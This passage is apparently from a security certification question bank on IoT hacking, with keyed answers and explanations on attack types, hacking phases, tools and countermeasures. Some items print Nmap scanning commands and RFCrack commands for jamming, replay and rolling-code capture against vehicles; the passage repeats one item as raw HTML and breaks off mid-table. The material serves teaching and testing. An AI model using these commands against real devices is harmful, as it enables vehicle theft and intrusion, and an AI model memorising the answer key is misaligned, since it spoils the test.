> **DDoS Attack:** Attacker converts the devices into an army of botnet to target a specific system or server, making it unavailable to provide services. DDoS, a Distributed Denial-of-Service attack is a type of attack where multiple infected systems are used to pound a single online system or service that makes the server useless, slow and unavailable for a legitimate user for a short period of time.  
> 
> **Side Channel Attack:** Attackers perform side channel attacks by extracting information about encryption keys by observing the emission of signals i.e. "side channels" from IoT devices.

659. Name an attack where an attacker interrupts communication between two devices by using the same frequency signals on which the devices are communicating.
+ [ ] Side channel attack
+ [ ] Man-in-the-middle attack
+ [x] Jamming attack
+ [ ] Replay attack
> **Explanation:**
> **Jamming Attack:** Jamming is a type of attack in which the communication between wireless IoT devices are jammed in order to compromise it. During this attack, an overwhelming volume of malicious traffic is sent which results in DoS attack to authorized users thus, obstructing legitimate traffic and making the endpoints unable to communicate with each other  
> 
> **Replay Attack:** Attackers intercept legitimate messages from a valid communication and continuously send the intercepted message to the target device to perform a denial-of-service attack or crash the target device.  
> 
> **Side Channel Attack:** Attackers perform side channel attacks by extracting information about encryption keys by observing the emission of signals i.e. "side channels" from IoT devices.  
> 
> **Man-in-the-Middle Attack:** An attacker pretends to be a legitimate sender who intercepts all the communication between the sender and receiver and hijacks the communication.

660. What is the name of the code that is used in locking or unlocking a car or a garage and prevents replay attacks?
+ [ ] Polymorphic code
+ [ ] Unicode
+ [ ] Hex code
+ [x] Rolling code
> **Explanation:**
> **Hex Code:** A color hex code is a way of specifying color using hexadecimal values. The code itself is a hex triplet, which represents three separate values that specify the levels of the component colors. It is used by programmers to describe locations in memory because it can represent every byte.  
> 
> **Unicode:** It is a character coding system to support worldwide interchange, processing, and display of the written texts. This type of code is mostly used in evading IDS.  
> 
> **Rolling Code:** the form of a code from a modern key fob that locks or unlocks the vehicle. Here a code is sent to the vehicle which is different for every other use and is only used once, that means if a vehicle receives a same code again it rejects it. This code which locks or unlocks a car or a garage is called as Rolling Code or Hopping Code. It is used in keyless entry system to prevent replay attacks. An eavesdropper can capture the code transmitted and later use it to unlock the garage or the vehicle.  
> 
> **Polymorphic Code:** It is code that uses a polymorphic engine to mutate while keeping the original algorithm intact. Polymorphic code can be also used to generate encryption algorithms.

661. In which of the following attacks does an attacker use multiple forged identities to create a strong illusion of traffic congestion, affecting communication between neighboring nodes and networks?
+ [x] Sybil attack
+ [ ] Rolling code attack
+ [ ] Replay attack
+ [ ] DoS attack
> **Explanation:**
> **Rolling Code Attack:** An attacker jams and sniffs the signal to obtain the code transferred to the vehicle’s receiver and uses it to unlock and steal the vehicle.  
> 
> **Sybil Attack:** Attacker uses multiple forged identities to create a strong illusion of traffic congestion, affecting communication between neighboring nodes and networks. Sybil attacks in VANETs (Vehicular Ad hoc Networks) are regarded as the most serious attacks which puts a great impact on network’s performance. This type of attack impairs the potential applications in VANETs by creating a strong illusion of traffic congestion.  
> 
> **Replay Attack:** Attackers intercept legitimate messages from a valid communication and continuously send the intercepted message to the target device to perform a denial-of-service attack or crash the target device.  
> 
> **DoS Attack:** Attackers make a machine or a network resource unavailable to its intended users by temporarily or indefinitely disrupting services of a host connected to the Internet.

662. In which of the following attacks does an attacker use a malicious script to exploit poorly patched vulnerabilities in an IoT device?
+ [ ] Side channel attack
+ [ ] Sybil attack
+ [ ] Replay attack
+ [x] Exploit kits
> **Explanation:**
> **Sybil Attack:** An attacker uses multiple forged identities to create a strong illusion of traffic congestion, affecting communication between neighboring nodes and networks.  
> 
> **Side Channel Attack:** Attackers perform side channel attacks by extracting information about encryption keys by observing the emission of signals i.e. "side channels" from IoT devices.  
> 
> **Replay Attack:** Attackers intercept legitimate messages from a valid communication and continuously send the intercepted message to the target device to perform a denial-of-service attack or crash the target device.  
> 
> **Exploit Kits:** Exploit kit is a malicious script used by the attackers to exploit poorly patched vulnerabilities in an IoT device. These kits are designed in such a way that whenever there are new vulnerabilities, new ways of exploitation and add on functions will be added to the device automatically.

663. In IoT hacking, which of the following component is used to send some unwanted commands in order to trigger some events which are not planned?
+ [ ] Eavesdropper
+ [ ] Wi-Fi Device
+ [ ] Bluetooth Device
+ [x] Fake Server
> **Explanation:**
> A Fake Server can be used to send some unwanted commands in order to trigger some events which are not planned. For example, some physical resource (water, coal, oil, electricity) can be sent to some unknown and unplanned destination and so on.

664. In which of the following attacks, an attacker intercepts legitimate messages from a valid communication and continuously send the intercepted message to the target device to crash the target device?
+ [ ] Man-in-the-middle Attack
+ [ ] Side Channel Attack
+ [x] Replay Attack
+ [ ] Ransomware Attack
> **Explanation:**
> In replay attack, attackers intercept legitimate messages from a valid communication and continuously send the intercepted message to the target device to perform a denial-of-service attack or delay it in order to manipulate the message or crash the target device.

665. Which of the following Nmap command is used by attackers to identify IPv6 capabilities of an IoT device?
+ [x] `nmap -6 -n -Pn -sSU -pT:0-65535,U:0-65535 -v -A -oX <Name><IP>`
+ [ ] `nmap -n -Pn -sS -pT:0-65535 -v -A -oX <Name><IP>`
+ [ ] `nmap -n -Pn -sSU -pT:0-65535,U:0-65535 -v -A -oX <Name><IP>`
+ [ ] `nmap -sA -P0 <IP>`
> **Explanation:**
> **Vulnerability scanning using Nmap**
> Attackers use vulnerability-scanning tools such as Nmap to identify the IoT devices connected to the network along with their open ports and services. Nmap generates raw IP packets in different ways to identify live hosts or devices on the network, services offered by them, their operating systems, type of packet filters used, etc.  
> 
> Attackers use the following Nmap command to scan a particular IP address:  
> + nmap -n -Pn -sS -pT:0-65535 -v -A -oX <Name><IP>  
> 
> To perform complete scan of the IoT device that checks for both TCP and UDP services and ports:  
> + nmap -n -Pn -sSU -pT:0-65535,U:0-65535 -v -A -oX <Name><IP>  
> 
> To identify the IPv6 capabilities of a device:  
> + nmap -6 -n -Pn -sSU -pT:0-65535,U:0-65535 -v -A -oX <Name><IP>


## Understanding IoT Hacking Methodology
666. Information such as IP address, protocols used, open ports, device type, and geo-location of a device is extracted by an attacker in which of the following phases of IoT hacking?
+ [ ] Launch attacks
+ [ ] Gain access
+ [ ] Vulnerability scanning
+ [x] Information gathering
> **Explanation:**
> **Vulnerability Scanning:** Once the attackers gather information about a target device, they search for the attack surfaces of a device (identify the vulnerabilities) which they can attack. Vulnerability scanning allows an attacker to find the total number of vulnerabilities present in the firmware, infrastructure and system components of an IoT device that is accessible. After identifying the attack surface area, the attacker will scan for vulnerabilities in that area to identify an attack vector and perform further exploitation on the device.  
> 
> **Gain Access:** Vulnerabilities identified in the vulnerability scanning phase allow an attacker to remotely gain access, command and control the attack while evading detection from various security products. Based on the vulnerabilities in an IoT device, the attacker may turn the device into a backdoor to gain access to an organization’s network without infecting any end system that is protected by IDS/IPS, firewall, antivirus software, etc.  
> 
> **Information Gathering:** The first and the foremost step in IoT device hacking is to extract information such as IP address, protocols used (Zigbee, BLE, 5G, IPv6LoWPAN, etc.), open ports, device type, Geo location of a device, manufacturing number and manufacturing company of a device. In this step, an attacker also identifies the hardware design, its infrastructure and the main components embedded on a target device that is present online.  
> 
> **Launch Attacks:** In vulnerability scanning phase, attackers try to find out the vulnerabilities present in the target device. The vulnerabilities found are then exploited further to launch various attacks such as DDoS attacks, rolling code attacks, jamming signal attacks, Sybil attacks, MITM attacks, data and identity theft attacks, etc.

667. Once an attacker gathers information about a target device in the first phase, what is the second phase in IoT device hacking?
+ [ ] Maintain access
+ [x] Vulnerability scanning
+ [ ] Information gathering
+ [ ] Gain access
> **Explanation:**
> **Gain Access:** Vulnerabilities identified in the vulnerability scanning phase allow an attacker to remotely gain access, command and control the attack while evading detection from various security products. Based on the vulnerabilities in an IoT device, the attacker may turn the device into a backdoor to gain access to an organization’s network without infecting any end system that is protected by IDS/IPS, firewall, antivirus software, etc.  
> 
> **Information Gathering:** The first and the foremost step in IoT device hacking is to extract information such as IP address, protocols used (Zigbee, BLE, 5G, IPv6LoWPAN, etc.), open ports, device type, Geo location of a device, manufacturing number and manufacturing company of a device. In this step, an attacker also identifies the hardware design, its infrastructure and the main components embedded on a target device that is present online.  
> 
> **Maintain Access:** Once the attacker gains access to the device, the attacker uses various techniques to maintain access and perform further exploitation. Attackers remain undetected by clearing the logs, updating firmware and using malicious programs such as backdoor, Trojans, etc. to maintain access.  
> 
> **Vulnerability Scanning:** Once the attackers gather information about a target device, they search for the attack surfaces of a device (identify the vulnerabilities) which they can attack. Vulnerability scanning allows an attacker to find the total number of vulnerabilities present in the firmware, infrastructure and system components of an IoT device that is accessible. After identifying the attack surface area, the attacker will scan for vulnerabilities in that area to identify an attack vector and perform further exploitation on the device.

668. If an attacker wants to gather information such as IP address, hostname, ISP, device’s location, and the banner of the target IoT device, which of the following tools should he use to do so?
+ [ ] Foren6
+ [ ] RIoT vulnerability scanner
+ [ ] Nmap
+ [x] Shodan
> **Explanation:**
> **Nmap:** Attackers use vulnerability-scanning tools such as Nmap to identify the IoT devices connected to the network along with their open ports and services. Nmap generates raw IP packets in different ways to identify live hosts or devices on the network, services offered by them, their operating systems, type of packet filters used, etc.  
> 
> **Shodan:** Shodan is a search engine that provides information about all the internet connected devices such as routers, traffic lights, CCTV cameras, servers, smart home devices, industrial devices, etc. Attackers can make use of this tool to gather information such as IP address, hostname, ISP, device’s location and the banner of the target IoT device.  
> 
> **RIoT Vulnerability Scanner:** Retina IoT vulnerability scanner identify at-risk IoT devices, such as IP cameras, DVRs, printers, routers, etc. This tool gives you an attacker’s view of all the IoT devices and their associated vulnerabilities. Utilizing precise information such as server banner and header data, RIoT will pinpoint the make and model of a particular IoT device.  
> 
> **Foren6:** Foren6 uses sniffers to capture 6LoWPAN traffic and renders the network state in a graphical user interface. It detects routing problems. The Routing Protocol for 6LoWPAN Networks, RPL, is an emerging IETF standard. Foren6 captures all RPL-related information and identifies abnormal behaviors. It combines multiple sniffers and captures live packets from deployed networks in a non-intrusive manner.

669. Which of the following tools can an attacker use to gather information such as open ports and services of IoT devices connected to the network?
+ [ ] RFCrack
+ [x] Nmap
+ [ ] Multiping
+ [ ] Foren6
> **Explanation:**
> **RFCrack:** Attackers use the RFCrack tool to obtain the rolling code sent by the victim to unlock a vehicle and later use the same code for unlocking and stealing the vehicle. RFCrack is used for testing RF communications between any physical device that communicates over sub Ghz frequencies.  
> 
> **Multiping:** An attacker can use the MultiPing tool to find IP address of any IoT device in the target network. After obtaining the IP address of an IoT device, the attacker can perform further scanning to identify vulnerabilities present in that device.  
> 
> **Foren6:** Foren6 uses sniffers to capture 6LoWPAN traffic and renders the network state in a graphical user interface. It detects routing problems. The Routing Protocol for 6LoWPAN Networks, RPL, is an emerging IETF standard. Foren6 captures all RPL-related information and identifies abnormal behaviors. It combines multiple sniffers and captures live packets from deployed networks in a non-intrusive manner.  
> 
> **Nmap:** Attackers use vulnerability-scanning tools such as Nmap to identify the IoT devices connected to the network along with their open ports and services. Nmap generates raw IP packets in different ways to identify live hosts or devices on the network, services offered by them, their operating systems, type of packet filters used, etc.

670. Which of the following tools is used to perform a rolling code attack by obtaining the rolling code sent by the victim?
+ [ ] Zigbee framework
+ [ ] HackRF one
+ [x] RF crack
+ [ ] RIoT vulnerability scanning
> **Explanation:**
> **Zigbee Framework:** Attify ZigBee framework consists of a set of tools used to perform ZigBee penetration testing. ZigBee protocol makes use of 16 different channels for all communications. Attackers use Zbstumbler from Attify Zigbee framework to identify the channel used by the target device.  
> 
> **HackRF One:** Attackers use HackRF One to perform attacks such as BlueBorne or AirBorne attacks such as replay, fuzzing, jamming, etc. HackRF One is an advanced hardware and software defined radio with the range of 1MHz to 6GHz. It transmits and receives radio waves in half-duplex mode, so it is easy for attackers to perform attacks using this device.  
> 
> **RFCrack:** Attackers use the RFCrack tool to obtain the rolling code sent by the victim to unlock a vehicle and later use the same code for unlocking and stealing the vehicle. RFCrack is used for testing RF communications between any physical device that communicates over sub Ghz frequencies.  
> 
> **RIoT Vulnerability Scanner:** Retina IoT vulnerability scanner identify at-risk IoT devices, such as IP cameras, DVRs, printers, routers, etc. This tool gives you an attacker’s view of all the IoT devices and their associated vulnerabilities. Utilizing precise information such as server banner and header data, RIoT will pinpoint the make and model of a particular IoT device.

671. Using which one of the following tools can an attacker perform BlueBorne or airborne attacks such as replay, fuzzing, and jamming?
+ [ ] Zigbee framework
+ [x] HackRF one
+ [ ] Foren6
+ [ ] RIoT vulnerability scanning
> **Explanation:**
> **Zigbee Framework:** Attify ZigBee framework consists of a set of tools used to perform ZigBee penetration testing. ZigBee protocol makes use of 16 different channels for all communications. Attackers use Zbstumbler from Attify Zigbee framework to identify the channel used by the target device.  
> 
> **RIoT Vulnerability Scanner:** Retina IoT vulnerability scanner identify at-risk IoT devices, such as IP cameras, DVRs, printers, routers, etc. This tool gives you an attacker’s view of all the IoT devices and their associated vulnerabilities. Utilizing precise information such as server banner and header data, RIoT will pinpoint the make and model of a particular IoT device.  
> 
> **HackRF One:** Attackers use HackRF One to perform attacks such as BlueBorne or AirBorne attacks such as replay, fuzzing, jamming, etc. HackRF One is an advanced hardware and software defined radio with the range of 1MHz to 6GHz. It transmits and receives radio waves in half-duplex mode, so it is easy for attackers to perform attacks using this device.  
> 
> **Foren6:** Foren6 uses sniffers to capture 6LoWPAN traffic and renders the network state in a graphical user interface. It detects routing problems. The Routing Protocol for 6LoWPAN Networks, RPL, is an emerging IETF standard. Foren6 captures all RPL-related information and identifies abnormal behaviors. It combines multiple sniffers and captures live packets from deployed networks in a non-intrusive manner.

672. If an attacker wants to reconstruct malicious firmware from a legitimate firmware in order to maintain access to the victim device, which of the following tools can he use to do so?
+ [ ] RFCrack
+ [ ] RIoT Vulnerability Scanner
+ [x] Firmware Mod Kit
+ [ ] Zigbee Framework
> **Explanation:**
> **Zigbee Framework:** Attify ZigBee framework consists of a set of tools used to perform ZigBee penetration testing. ZigBee protocol makes use of 16 different channels for all communications. Attackers use Zbstumbler from Attify Zigbee framework to identify the channel used by the target device.  
> 
> **RIoT Vulnerability Scanner:** Retina IoT vulnerability scanner identify at-risk IoT devices, such as IP cameras, DVRs, printers, routers, etc. This tool gives you an attacker’s view of all the IoT devices and their associated vulnerabilities. Utilizing precise information such as server banner and header data, RIoT will pinpoint the make and model of a particular IoT device.  
> 
> **RFCrack:** Attackers use the RFCrack tool to obtain the rolling code sent by the victim to unlock a vehicle and later use the same code for unlocking and stealing the vehicle. RFCrack is used for testing RF communications between any physical device that communicates over sub Ghz frequencies.  
> 
> **Firmware Mod Kit:** Attackers remain undetected by clearing the logs, updating firmware and using malicious programs such as backdoor, Trojans, etc. to maintain access. Attackers use tools such as Firmware Mod Kit, Firmalyzer Enterprise, Firmware Analysis Toolkit, etc. to exploit firmware. The Firmware Mod Kit allows for easy deconstruction and reconstruction of firmware images for various embedded devices.

673. If an attacker wants to gather information such as IP address, hostname, ISP, device’s location, and the banner of the target IoT device, which of the following types of tools can he use to do so?
+ [ ] Vulnerability scanning tools
+ [ ] IoT hacking tools
+ [ ] Sniffing tools
+ [x] Information gathering tools
> **Explanation:**
> Sniffing Tools: System administrators use automated tools to monitor their network and devices connected to the network, but attackers misuse these tools to sniff network data. This type of tools are used for sniffing traffic, capturing packets, etc.  
> 
> **Vulnerability Scanning Tools:** Vulnerability scanning allows an attacker to identify vulnerabilities in IoT devices and their network and to further determine how they can be exploited. These tools assist network security professionals in overcoming the identified weaknesses in the device and network by suggesting various remediation techniques to protect the organization’s network.  
> 
> **IoT Hacking Tools:** IoT hacking tools are used by attackers to exploit target IoT devices and network to perform various attacks such as DDoS, jamming, BlueBorne, etc.  
> 
> **Information Gathering Tools:** Attackers use information gathering tools such as Shodan and Censys to gather basic information about the target device and network. Using these tools attackers obtain information such as live devices connected to the network, their make, IP addresses, open ports and services, their physical location, banner of the target IoT device, etc.

674. Out of the following tools, which tool can be used to find buffer overflow vulnerabilities present in the system?
+ [x] beSTORM
+ [ ] Z-Wave Sniffer
+ [ ] Censys
+ [ ] Firmalyzer Enterprise
> **Explanation:**
> **Z-Wave Sniffer:** It is used to sniff traffic, perform real-time monitoring and capture packets from all Z-Wave networks. It is a hardware tool used to sniff traffic generated by smart devices connected in the network.  
> 
> **Censys:** Censys is a public search engine and data processing facility backed by data collected from ongoing Internet-wide scans. Censys supports full-text searches on protocol banners and queries a wide range of derived fields.  
> 
> **Firmalyzer Enterprise:** Firmalyzer enables device vendors and security professionals to perform automated security assessment on software that powers IoT devices (firmware) in order to identify configuration and application vulnerabilities. This tool notifies users about the vulnerabilities discovered and assists to mitigate those in a timely manner.  
> 
> **beSTORM:** beSTORM is a smart fuzzer to find buffer overflow vulnerabilities by automating and documenting the process of delivering corrupted input and watching for unexpected response from the application. It supports multi-protocol environment and address breaches by testing over 50 protocols while providing automated binary and textual analysis, advanced debugging and stack tracing.

675. Out of the following RFCrack commands, which command is used by an attacker to perform jamming?
+ [ ] `python RFCrack.py -r -M MOD_2FSK -F 314350000`
+ [ ] `python RFCrack.py -i`
+ [x] `python RFCrack.py -j -F 314000000`
+ [ ] `python RFCrack.py -r -U "-75" -L "-5" -M MOD_2FSK -F 314350000`
> **Explanation:**
> Attackers use the RFCrack tool to obtain the rolling code sent by the victim to unlock a vehicle and later use the same code for unlocking and stealing the vehicle. RFCrack is used for testing RF communications between any physical device that communicates over sub Ghz frequencies. It is used along with the combination of hardware such as yardsticks to jam, replay and sniff the signal coming from the sender.  
> 
> Some of the commands used by an attacker to perform rolling code attack, are given below:  
> + Live Replay: `python RFCrack.py -i`
> + Rolling Code: `python RFCrack.py -r -M MOD_2FSK -F 314350000`
> + Adjust RSSI Range: `python RFCrack.py -r -U "-75" -L "-5" -M MOD_2FSK -F 314350000`
> + Jamming: `python RFCrack.py -j -F 314000000`


## IoT Countermeasures
676. In order to protect a device against insecure network services vulnerability, which of the following solutions should be implemented?
+ [ ] Enable two-factor authentication
+ [ ] Implement secure password recovery mechanisms
+ [ ] End-to-end encryption
+ [x] Disable UPnP
> **Explanation:**
> |Vulnerabilities|Solutions|
> |:----|:----|
> | 1. Insecure Web Interface | Enable default credentials to be changed |
> | | Enable account lockout mechanism |
> | | Conduct periodic assessment of web applications |
> | 2. Insufficient Authentication / Authorization | Implement secure password recovery mechanisms |
> | | Use strong and complex passwords |
> | | Enable two-factor authentication |
> | 3. Insecure Network Services | Close open network ports |
> | | Disable UPnP |
> | | Review network services for vulnerabilities |
> | 4. Lack of Transport Encryption / Integrity Verification | Encrypt communication between endpoints |
> | | Maintain SSL/TLS implementations |
> | | Not to use proprietary encryption solutions |


677. Which of the following TCP/UDP port is used by the infected devices to spread malicious files to other devices in the network?
+ [ ] Port 22
+ [ ] Port 53
+ [ ] Port 23
+ [x] Port 48101
> **Explanation:**
> + **Port 23:** TCP port 23 is used for Telnet Services.  
> + **Port 48101:** TCP/UDP port 48101 is used by the infected devices to spread malicious files to the other devices in the network. Monitor traffic on port 48101 as the infected devices attempt to spread the malicious file using port 48101  
> + **Port 22:** TCP port 22 is used for SSH services.  
> + **Port 53:** TCP/UDP port 53 is used for DNS services.

678. Which of the following is a security consideration for the gateway component of IoT architecture?
+ [x] Multi-directional encrypted communications, strong authentication of all the components, automatic updates
+ [ ] Local storage security, encrypted communications channels
+ [ ] Secure web interface, encrypted storage
+ [ ] Storage encryption, update components, no default passwords
> **Explanation:**
> **Mobile:** An ideal framework for the mobile interface should include proper authentication mechanism for the user, account lockout mechanism after a certain number of failed attempts, local storage security, encrypted communication channels and the security of the data transmitted over the channel.  
> 
> **Gateway:** An ideal framework for the gateway should incorporate strong encryption techniques for secure communications between endpoints. Also, the authentication mechanism for the edge components should be as strong as any other component in the framework. Where ever possible the gateway should be designed in such a way that it authenticates multi-directionally to carry out trusted communication between the edge and the cloud. Automatic updates should also be provided to the device for countering vulnerabilities.  
> 
> **Cloud Platform:** A secure framework for the cloud component should include encrypted communications, strong authentication credentials, secure web interface, encrypted storage, automatic updates and so on.  
> 
> **Edge:** Framework consideration for edge would be proper communications and storage encryption, no default credentials, strong passwords, use latest up to date components and so on.

679. In order to prevent an illegitimate user from performing a brute force attack, what security mechanism should be implemented to the accounts?
+ [ ]  Use of SSL/TLS
+ [ ]  Use of strong passwords
+ [ ]  Secure boot chain mechanism
+ [x]  Account lockout mechanism
> **Explanation:**
> Companies manufacturing IoT devices should make sure that they implement basic security measurements that include:  
> + SSL/TLS should be used for communication purpose  
> + There should be a mutual check on SSL certificates and the certificate revocation list  
> + Use of strong passwords should be encouraged  
> + The device’s update process should be simple, secured with a chain of trust  
> + Implementing account lockout mechanisms after certain wrong login attempts to prevent brute force attacks  
> + Lock the devices down whenever and wherever possible to prevent them from attacks  
> + Periodically checking the device for unused tools and using whitelisting to allow only trusted tools or application to run
> 
> Use secure boot chain to verify all software that is executed on the device

680. Which of the following tools can be used to protect private data and home networks while preventing unauthorized access using PKI-based security solutions for IoT devices?
+ [x] DigiCert IoT Security Solution
+ [ ] Firmalyzer Enterprise
+ [ ] SeaCat.io
+ [ ] Censys
> **Explanation:**
> **.DigiCert IoT Security Solution:** DigiCert Home and Consumer IoT Security Solutions protect private data and home networks while preventing unauthorized access using PKI-based security solutions for consumer IoT devices.  
> 
> **SeaCat.io:** SeaCat.io is a security-first SaaS technology to operate IoT products in a reliable, scalable and secure manner. It provides protection to end users, business, and data.  
> 
> **Censys:** Censys is a public search engine and data processing facility backed by data collected from ongoing Internet-wide scans. Censys supports full-text searches on protocol banners and queries a wide range of derived fields.  
> 
> **Firmalyzer Enterprise:** Firmalyzer enables device vendors and security professionals to perform automated security assessment on software that powers IoT devices (firmware) in order to identify configuration and application vulnerabilities. This tool notifies users about the vulnerabilities discovered and assists to mitigate those in a timely manner.

681. Encrypted communications, strong authentication credentials, secure web interface, encrypted storage, and automatic updates are the security considerations for which of the following components?
+ [ ] Edge
+ [x] Cloud Platform
+ [ ] Mobile
+ [ ] Gateway
> **Explanation:**
> **Mobile:** An ideal framework for the mobile interface should include proper authentication mechanism for the user, account lockout mechanism after a certain number of failed attempts, local storage security, encrypted communication channels and the security of the data transmitted over the channel.  
> 
> **Cloud Platform:** A secure framework for the cloud component should include encrypted communications, strong authentication credentials, secure web interface, encrypted storage, automatic updates and so on.  
> 
> **Edge:** Framework consideration for edge would be proper communications and storage encryption, no default credentials, strong passwords, use latest up to date components and so on.  
> 
> **Gateway:** An ideal framework for the gateway should incorporate strong encryption techniques for secure communications between endpoints. Also, the authentication mechanism for the edge components should be as strong as any other component in the framework. Where ever possible the gateway should be designed in such a way that it authenticates multi-directionally to carry out trusted communication between the edge and the cloud. Automatic updates should also be provided to the device for countering vulnerabilities.

682. Secure update server, verify updates before installation, and sign updates are the solutions for which of the following IoT device vulnerabilities?
+ [ ] Insecure cloud interface
+ [ ] Privacy concerns
+ [x] Insecure software / firmware
+ [ ] Insecure network services
> **Explanation:**
> | IoT Device Vulnerabilities | Solutions |
> |----|----|
> | 1. Insecure Network Services | Close open network ports |
> | | Disable UPnP |
> | | Review network services for vulnerabilities |
> | 2. Privacy Concerns | Minimize data collection |
> | | Anonymize collected data |
> | | Providing end users the ability to decide what data is collected |
> | 3. Insecure Cloud Interface|Conduct assessment of all the cloud interfaces |
> | | Use strong and complex password |
> | | Enable two-factor authentication |
> | 4. Insecure Software / Firmware | Secure update servers |
> | | Verify updates before installation | 
> | | Sign updates |


683. An attacker can perform attacks such as CSRF, SQLi, and XSS attack by exploiting which of the following IoT device vulnerability?
+ [ ] Insecure cloud interface
+ [ ] Insecure software/firmware
+ [ ] Insecure network services
+ [x] Insecure web interface
> **Explanation:**
> |IoT Device Vulnerabilities|Obstacles|
> |:----|:----|
> | 1. Insecure Web Interface|Default credentials |
> | | Absence of account lockout mechanism |
> | | CSRF, SQLi, XSS vulnerabilities |
> | 2. Insecure Cloud Interface | No review of interfaces for security vulnerabilities |
> | | Presence of weak passwords |
> | | Absence of two-factor authentication |
> | 3. Insecure Network Services|Vulnerable to Denial-of-Service attack |
> | | Exposed ports via UPnP |
> | | Unwanted ports are open |
> | 4. Insecure Software / Firmware | Insecure update servers |
> | | Transmission of unencrypted device updates |
> | |  Unsigned device updates |


684. Proper communication and storage encryption, no default credentials, strong passwords, and up-to-date components are the security considerations for which of the following component?
+ [ ] Gateway
+ [ ] Cloud Platform
+ [ ] Mobile
+ [x] Edge
> **Explanation:**
> **Mobile:** An ideal framework for the mobile interface should include proper authentication mechanism for the user, account lockout mechanism after a certain number of failed attempts, local storage security, encrypted communication channels and the security of the data transmitted over the channel.  
> 
> **Cloud Platform:** A secure framework for the cloud component should include encrypted communications, strong authentication credentials, secure web interface, encrypted storage, automatic updates and so on.  
> 
> **Edge:** Framework consideration for edge would be proper communications and storage encryption, no default credentials, strong passwords, use latest up to date components and so on.  
> 
> **Gateway:** An ideal framework for the gateway should incorporate strong encryption techniques for secure communications between endpoints. Also, the authentication mechanism for the edge components should be as strong as any other component in the framework. Where ever possible the gateway should be designed in such a way that it authenticates multi-directionally to carry out trusted communication between the edge and the cloud. Automatic updates should also be provided to the device for countering vulnerabilities.

685. Which of the following tools offers SaaS technology and assists in operating IoT products in a reliable, scalable, and secure manner?
+ [ ] Firmalyzer Enterprise
+ [ ] beSTORM
+ [ ] DigiCert IoT Security Solution
+ [x] SeaCat.io
> **Explanation:**
> **SeaCat.io:** SeaCat.io is a security-first SaaS technology to operate IoT products in a reliable, scalable and secure manner. It provides protection to end users, business, and data.
> 
> **DigiCert IoT Security Solution:** DigiCert Home and Consumer IoT Security Solutions protect private data and home networks while preventing unauthorized access using PKI-based security solutions for consumer IoT devices.
> 
> **Firmalyzer Enterprise:** Firmalyzer enables device vendors and security professionals to perform automated security assessment on software that powers IoT devices (firmware) in order to identify configuration and application vulnerabilities. This tool notifies users about the vulnerabilities discovered and assists to mitigate those in a timely manner.
> 
> **beSTORM:** beSTORM is a smart fuzzer to find buffer overflow vulnerabilities by automating and documenting the process of delivering corrupted input and watching for unexpected response from the application. It supports multi-protocol environment and address breaches by testing over 50 protocols while providing automated binary and textual analysis, advanced debugging and stack tracing

676. In order to protect a device against insecure network services vulnerability, which of the following solutions should be implemented?
+ [ ] Enable two-factor authentication
+ [ ] Implement secure password recovery mechanisms
+ [ ] End-to-end encryption
+ [x] Disable UPnP
> **Explanation:**
> 
<p><span style="color: black; font-family: Calibri, sans-serif;"> </span></p>
<table width="604" cellspacing="0" cellpadding="0" border="0">
    <tbody>
        <tr style="height: 33pt;">
            <td style="height: 33pt; width: 166.5pt; padding: 5pt; border: 1pt solid black; text-align: left;" valign="top">
            <p><strong><span style="color: black; font-size: 12pt; font-family: Calibri, sans-serif;">Vulnerabilities</span></strong></p>
            </td>
            <td style="height: 33pt; width: 286.5pt; padding: 5pt; border-top: 1pt solid black; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><strong><span style="color: black; font-size: 12pt; font-family: Calibri, sans-serif;">Solutions</span></strong></p>
            </td>
        </tr>
        <tr style="height: 63pt;">
            <td style="height: 63pt; width: 166.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: 1pt solid black; text-align: left;" valign="top">
            <p><strong><span style="color: black; font-family: Calibri, sans-serif;">1. Insecure Web Interface</span></strong></p>
            </td>
            <td style="height: 63pt; width: 286.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-family: Calibri, sans-serif;">Enable default credentials to be changed</span></p>
            <p><span style="color: black; font-family: Calibri, sans-serif;">Enable account lockout mechanism</span></p>
            <p><span style="color: black; font-family: Calibri, sans-serif;">Conduct <g class="gr_ gr_31 gr-alert gr_gramm gr_inline_cards gr_run_anim Grammar only-ins doubleReplace replaceWithoutSep" id="31" data-gr-id="31">periodic</g> assessment of web applications</span></p>
            </td>
        </tr>
        <tr style="height: 63pt;">
            <td style="height: 63pt; width: 166.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: 1pt solid black; text-align: left;" valign="top">
            <p><strong><span style="color: black; font-family: Calibri, sans-serif;">2. Insufficient Authentication / Authorization</span></strong></p>
            </td>
            <td style="height: 63pt; width: 286.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-family: Calibri, sans-serif;">Implement secure password recovery mechanisms</span></p>
            <p><span style="color: black; font-family: Calibri, sans-serif;">Use strong and complex passwords</span></p>
            <p><span style="color: black; font-family: Calibri, sans-serif;">Enable two-factor authentication</span></p>
            </td>
        </tr>
        <tr style="height: 63pt;">
            <td style="height: 63pt; width: 166.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: 1pt solid black; text-align: left;" valign="top">
            <p><strong><span style="color: black; font-family: Calibri, sans-serif;">3. Insecure Network Services</span></strong></p>
            </td>
            <td style="height: 63pt; width: 286.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-family: Calibri, sans-serif;">Close open network ports</span></p>
            <p><span style="color: black; font-family: Calibri, sans-serif;">Disable UPnP</span></p>
            <p><span style="color: black; font-family: Calibri, sans-serif;">Review network services for vulnerabilities</span></p>
            </td>
        </tr>
        <tr style="height: 63pt;">
            <td style="height: 63pt; width: 166.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: 1pt solid black; text-align: left;" valign="top">
            <p><strong><span style="color: black; font-family: Calibri, sans-serif;">4. Lack of Transport Encryption / Integrity Verification</span></strong></p>
            </td>
            <td style="height: 63pt; width: 286.5pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-family: Calibri, sans-serif;">Encrypt communication between endpoints</span></p>
